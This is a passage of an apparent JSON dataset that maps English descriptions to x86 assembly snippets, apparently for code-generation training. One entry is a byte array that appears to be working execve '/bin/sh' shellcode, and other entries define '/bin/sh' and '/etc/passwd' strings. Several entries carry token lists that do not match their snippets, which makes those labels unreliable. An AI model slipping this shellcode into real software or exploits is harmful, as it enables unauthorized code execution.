      "value",
      "7",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "loopnz",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "7"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero",
    "rewritten_intent": "decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero",
    "snippet": "loopnz Label1",
    "slot_map": {
      "Label1": "var2",
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "loopnz",
      "var2"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero",
    "rewritten_intent": "decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero",
    "snippet": "loopnz next",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "next",
      "label",
      "if",
      "var0",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "loopnz",
      "next"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register",
    "rewritten_intent": "decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register",
    "snippet": "loopnz next \\n jmp ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "next",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "zero",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "loopnz",
      "next",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register",
    "rewritten_intent": "decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register",
    "snippet": "loopnz next2 \\n jmp edi",
    "slot_map": {
      "ecx": "var0",
      "next2": "var2",
      "edi": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "zero",
      "else",
      "jump",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "loopnz",
      "var2",
      "\\n",
      "jmp",
      "var3"
    ]
  },
  {
    "intent": "create label main_inc",
    "rewritten_intent": "create label main_inc",
    "snippet": "main_inc:",
    "slot_map": {
      "main_inc": "var0"
    },
    "intent_tokens": [
      "create",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define main_loop label",
    "rewritten_intent": "define main_loop label",
    "snippet": "main_loop:",
    "slot_map": {
      "main_loop": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "create label main_push",
    "rewritten_intent": "create label main_push",
    "snippet": "main_push:",
    "slot_map": {
      "main_push": "var0"
    },
    "intent_tokens": [
      "create",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the main_push label",
    "rewritten_intent": "declare the main_push label",
    "snippet": "main_push:",
    "slot_map": {
      "main_push": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "create main label",
    "rewritten_intent": "create main label",
    "snippet": "main:",
    "slot_map": {},
    "intent_tokens": [
      "create",
      "main",
      "label"
    ],
    "snippet_tokens": [
      "main",
      ":"
    ]
  },
  {
    "intent": "define main label",
    "rewritten_intent": "define main label",
    "snippet": "main:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "main",
      "label"
    ],
    "snippet_tokens": [
      "main",
      ":"
    ]
  },
  {
    "intent": "allocate memory for the marks array of words and initialize all elements to zero",
    "rewritten_intent": "allocate memory for the marks array of words and initialize all elements to zero",
    "snippet": "marks dw 0, 0, 0, 0",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "memory",
      "var0",
      "marks",
      "array",
      "words",
      "and",
      "initialize",
      "all",
      "elements",
      "zero"
    ],
    "snippet_tokens": [
      "marks",
      "dw",
      "0",
      ",",
      "0",
      ",",
      "0",
      ",",
      "0"
    ]
  },
  {
    "intent": "allocate memory for a 12*10 quad-bytes matrix",
    "rewritten_intent": "allocate memory for a 12*10 quad-bytes matrix",
    "snippet": "matrix qw 12*10",
    "slot_map": {
      "12*10": "var1",
      "quad-bytes": "var2",
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "memory",
      "var0",
      "var1",
      "var2",
      "matrix"
    ],
    "snippet_tokens": [
      "matrix",
      "qw",
      "var1"
    ]
  },
  {
    "intent": "declare the me label",
    "rewritten_intent": "declare the me label",
    "snippet": "me:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "me",
      "label"
    ],
    "snippet_tokens": [
      "me",
      ":"
    ]
  },
  {
    "intent": "define me label",
    "rewritten_intent": "define me label",
    "snippet": "me:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "me",
      "label"
    ],
    "snippet_tokens": [
      "me",
      ":"
    ]
  },
  {
    "intent": "define message byte and initialize it to '/bin/sh'",
    "rewritten_intent": "define message byte and initialize it to '/bin/sh'",
    "snippet": "message db '/bin/sh'",
    "slot_map": {
      "'/bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "message",
      "byte",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "message",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define message as the byte string '/bin/sh'",
    "rewritten_intent": "define message as the byte string '/bin/sh'",
    "snippet": "message db '/bin/sh'",
    "slot_map": {
      "'/bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "message",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "message",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the string message and initialize it to '/etc/passwd'",
    "rewritten_intent": "define the string message and initialize it to '/etc/passwd'",
    "snippet": "message db '/etc/passwd'",
    "slot_map": {
      "'/etc/passwd'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "message",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "message",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define message as the byte string '/etc/passwd'",
    "rewritten_intent": "define message as the byte string '/etc/passwd'",
    "snippet": "message db '/etc/passwd'",
    "slot_map": {
      "'/etc/passwd'": "var0"
    },
    "intent_tokens": [
      "define",
      "message",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "message",
      "db",
      "var0"
    ]
  },
  {
    "intent": "allocate memory for a null terminated string 'hello\\n'",
    "rewritten_intent": "allocate memory for a null terminated string 'hello\\n'",
    "snippet": "message db 'hello',13,0",
    "slot_map": {
      "'hello\\n'": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "memory",
      "var0",
      "null",
      "terminated",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "message",
      "db",
      "'hello',13,0"
    ]
  },
  {
    "intent": "declare message to contain the bytes 'hello world!'",
    "rewritten_intent": "declare message to contain the bytes 'hello world!'",
    "snippet": "message: db 'hello world!'",
    "slot_map": {
      "'hello world!'": "var0"
    },
    "intent_tokens": [
      "declare",
      "message",
      "contain",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "message",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68",
    "rewritten_intent": "define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68",
    "snippet": "message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68",
    "slot_map": {
      "0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68": "var0"
    },
    "intent_tokens": [
      "define",
      "message",
      "array",
      "bytes",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "message",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "move the value of ax into memory at address 1000h",
    "rewritten_intent": "move the value of ax into memory at address 1000h",
    "snippet": "mov [1000h], ax",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "value",
      "ax",
      "memory",
      "address",
      "1000h"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move the contents of the al register at the memory location specified by the operation [bp+0x07]",
    "rewritten_intent": "move the contents of the al register at the memory location specified by the operation [bp+0x07]",
    "snippet": "mov [bp+0x07], al",
    "slot_map": {
      "bp+0x07": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "move",
      "contents",
      "al",
      "register",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move the contents of the al register at the memory location specified by the operation [bp+0x0a]",
    "rewritten_intent": "move the contents of the al register at the memory location specified by the operation [bp+0x0a]",
    "snippet": "mov [bp+0x0a], al",
    "slot_map": {
      "bp+0x0a": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "al",
      "register",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move the contents of the al register at the memory location specified by the operation [bp+0x31]]",
    "rewritten_intent": "move the contents of the al register at the memory location specified by the operation [bp+0x31]]",
    "snippet": "mov [bp+0x31], al",
    "slot_map": {
      "bp+0x31": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "al",
      "register",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move the contents of the si register at the memory location specified by the operation [bp+0x32]",
    "rewritten_intent": "move the contents of the si register at the memory location specified by the operation [bp+0x32]",
    "snippet": "mov [bp+0x32], si",
    "slot_map": {
      "bp+0x32": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "si",
      "register",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move the contents of the bx register at the memory location specified by the operation [bp+0x36]",
    "rewritten_intent": "move the contents of the bx register at the memory location specified by the operation [bp+0x36]",
    "snippet": "mov [bp+0x36], bx",
    "slot_map": {
      "bp+0x36": "var2",
      "bx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move the contents of the bx register at the memory location specified by the operation [bp+0x3a]",
    "rewritten_intent": "move the contents of the bx register at the memory location specified by the operation [bp+0x3a]",
    "snippet": "mov [bp+0x3a], bx",
    "slot_map": {
      "bp+0x3a": "var2",
      "bx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move the contents of the ax register at the memory location specified by the operation [bp+0x3e]",
    "rewritten_intent": "move the contents of the ax register at the memory location specified by the operation [bp+0x3e]",
    "snippet": "mov [bp+0x3e], ax",
    "slot_map": {
      "bp+0x3e": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "ax",
      "register",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "1000h",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "move edi into the local memory address ebp-4",
    "rewritten_intent": "move edi into the local memory address ebp-4",
    "snippet": "mov [ebp-4], edi",
    "slot_map": {
      "ebp-4": "var1",
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "local",
      "memory",
      "address",
      "ebp-4"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ecx into the address [ebp+12]",
    "rewritten_intent": "move ecx into the address [ebp+12]",
    "snippet": "mov [ebp+12], ecx",
    "slot_map": {
      "ebp+12": "var2",
      "ecx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of ecx into the memory location specified by the operation [ebp+12]",
    "rewritten_intent": "move the contents of ecx into the memory location specified by the operation [ebp+12]",
    "snippet": "mov [ebp+12], ecx",
    "slot_map": {
      "ebp+12": "var2",
      "ecx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of zero_reg into the memory location specified by the operation [ebp+20]",
    "rewritten_intent": "move the contents of zero_reg into the memory location specified by the operation [ebp+20]",
    "snippet": "mov [ebp+20], zero_reg",
    "slot_map": {
      "ebp+20": "var2",
      "zero_reg": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move zero_reg into the address [ebp+20]",
    "rewritten_intent": "move zero_reg into the address [ebp+20]",
    "snippet": "mov [ebp+20], zero_reg",
    "slot_map": {
      "ebp+20": "var2",
      "zero_reg": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the word at the address ax into [ebp+22]",
    "rewritten_intent": "move the word at the address ax into [ebp+22]",
    "snippet": "mov [ebp+22], word ax",
    "slot_map": {
      "ebp+22": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "word",
      "address",
      "ax",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the word in ax into the memory location specified by the operation [ebp+22]",
    "rewritten_intent": "move the word in ax into the memory location specified by the operation [ebp+22]",
    "snippet": "mov [ebp+22], word ax",
    "slot_map": {
      "ebp+22": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "word",
      "ax",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of eax into address defined by ebp+var_a",
    "rewritten_intent": "move the contents of eax into address defined by ebp+var_a",
    "snippet": "mov [ebp+var_a], eax",
    "slot_map": {
      "ebp+var_a": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "address",
      "defined",
      "ebp+var_a"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move dl into the address [ebx + 6]",
    "rewritten_intent": "move dl into the address [ebx + 6]",
    "snippet": "mov [ebx + 6], dl",
    "slot_map": {
      "ebx + 6": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 110 into the effective address saved in ebx",
    "rewritten_intent": "move 110 into the effective address saved in ebx",
    "snippet": "mov [ebx], 110",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "110",
      "effective",
      "address",
      "saved",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "110"
    ]
  },
  {
    "intent": "move 123 into the effective address saved in ebx",
    "rewritten_intent": "move 123 into the effective address saved in ebx",
    "snippet": "mov [ebx], 123",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "123",
      "effective",
      "address",
      "saved",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "123"
    ]
  },
  {
    "intent": "move dl into the address [ebx+0xe]",
    "rewritten_intent": "move dl into the address [ebx+0xe]",
    "snippet": "mov [ebx+0xe], dl",
    "slot_map": {
      "ebx+0xe": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "123"
    ]
  },
  {
    "intent": "move eax into ebx+12",
    "rewritten_intent": "move eax into ebx+12",
    "snippet": "mov [ebx+12], eax",
    "slot_map": {
      "ebx+12": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ebx+12"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move al into ebx+7",
    "rewritten_intent": "move al into ebx+7",
    "snippet": "mov [ebx+7], al",
    "slot_map": {
      "ebx+7": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "ebx+7"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move ebx into ebx+8",
    "rewritten_intent": "move ebx into ebx+8",
    "snippet": "mov [ebx+8], ebx",
    "slot_map": {
      "ebx+8": "var0"
    },
    "intent_tokens": [
      "move",
      "ebx",
      "ebx+8"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "ebx"
    ]
  },
  {
    "intent": "move 25 decimal into the memory address ecx",
    "rewritten_intent": "move 25 decimal into the memory address ecx",
    "snippet": "mov [ecx], 25",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "25",
      "decimal",
      "memory",
      "address",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "25"
    ]
  },
  {
    "intent": "move eax into the address [ecx+4]",
    "rewritten_intent": "move eax into the address [ecx+4]",
    "snippet": "mov [ecx+4], eax",
    "slot_map": {
      "ecx+4": "var2",
      "eax": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "25"
    ]
  },
  {
    "intent": "move al into edi register",
    "rewritten_intent": "move al into edi register",
    "snippet": "mov [edi], al",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the address [esi+22]",
    "rewritten_intent": "move al into the address [esi+22]",
    "snippet": "mov [esi+22], al",
    "slot_map": {
      "esi+22": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the address [esi+34]",
    "rewritten_intent": "move al into the address [esi+34]",
    "snippet": "mov [esi+34], al",
    "slot_map": {
      "esi+34": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move esi into the address [esi+35]",
    "rewritten_intent": "move esi into the address [esi+35]",
    "snippet": "mov [esi+35], esi",
    "slot_map": {
      "esi+35": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "esi",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move ebx into the address [esi+39]",
    "rewritten_intent": "move ebx into the address [esi+39]",
    "snippet": "mov [esi+39], ebx",
    "slot_map": {
      "esi+39": "var2",
      "ebx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move ebx into the address [esi+43]",
    "rewritten_intent": "move ebx into the address [esi+43]",
    "snippet": "mov [esi+43], ebx",
    "slot_map": {
      "esi+43": "var2",
      "ebx": "var0",
      "[": "var1",
      "]": "var3"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move eax into the address [esi+47]",
    "rewritten_intent": "move eax into the address [esi+47]",
    "snippet": "mov [esi+47], eax",
    "slot_map": {
      "esi+47": "var2",
      "eax": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move the contents of cl into the byte at memory address esi+eax",
    "rewritten_intent": "move the contents of cl into the byte at memory address esi+eax",
    "snippet": "mov [esi+eax], cl",
    "slot_map": {
      "esi+eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "cl",
      "byte",
      "memory",
      "address",
      "esi+eax"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move cl into the address [esp + 1]",
    "rewritten_intent": "move cl into the address [esp + 1]",
    "snippet": "mov [esp + 1], cl",
    "slot_map": {
      "esp + 1": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "cl",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move esp into the address [esp+4]",
    "rewritten_intent": "move esp into the address [esp+4]",
    "snippet": "mov [esp+4], esp",
    "slot_map": {
      "esp+4": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "esp",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move al into the address [esp+57]",
    "rewritten_intent": "move al into the address [esp+57]",
    "snippet": "mov [esp+57], al",
    "slot_map": {
      "esp+57": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "move",
      "al",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move ah into the address [esp+58]",
    "rewritten_intent": "move ah into the address [esp+58]",
    "snippet": "mov [esp+58], ah",
    "slot_map": {
      "esp+58": "var2",
      "ah": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move ebx into the address [esp+59]",
    "rewritten_intent": "move ebx into the address [esp+59]",
    "snippet": "mov [esp+59], ebx",
    "slot_map": {
      "esp+59": "var2",
      "ebx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move the contents of ebx into the 4 bytes at memory address var",
    "rewritten_intent": "move the contents of ebx into the 4 bytes at memory address var",
    "snippet": "mov [var], ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "4",
      "bytes",
      "memory",
      "address",
      "var"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of eax into the 4 bytes at memory address var1",
    "rewritten_intent": "move the contents of eax into the 4 bytes at memory address var1",
    "snippet": "mov [var1], eax",
    "slot_map": {
      "eax": "var0",
      "var1": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "4",
      "bytes",
      "memory",
      "address",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move al into memory address a_letter",
    "rewritten_intent": "move al into memory address a_letter",
    "snippet": "mov a_letter, al",
    "slot_map": {
      "a_letter": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "memory",
      "address",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "al"
    ]
  },
  {
    "intent": "move 0x80 into ah",
    "rewritten_intent": "move 0x80 into ah",
    "snippet": "mov ah, 0x80",
    "slot_map": {
      "0x80": "var0",
      "ah": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the effective address of byte_tbl+2 to al register",
    "rewritten_intent": "move the effective address of byte_tbl+2 to al register",
    "snippet": "mov al, [byte_tbl+2]",
    "slot_map": {
      "byte_tbl+2": "var0"
    },
    "intent_tokens": [
      "move",
      "effective",
      "address",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of the esi register into the al register",
    "rewritten_intent": "move the contents of the esi register into the al register",
    "snippet": "mov al, [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move 03h into al",
    "rewritten_intent": "move 03h into al",
    "snippet": "mov al, 03h",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "03h",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "03h"
    ]
  },
  {
    "intent": "move 04h into al",
    "rewritten_intent": "move 04h into al",
    "snippet": "mov al, 04h",
    "slot_map": {
      "04h": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 05h into al",
    "rewritten_intent": "move 05h into al",
    "snippet": "mov al, 05h",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "05h",
      "al"
    ],
    "snippet_tokens": [
      "mov",
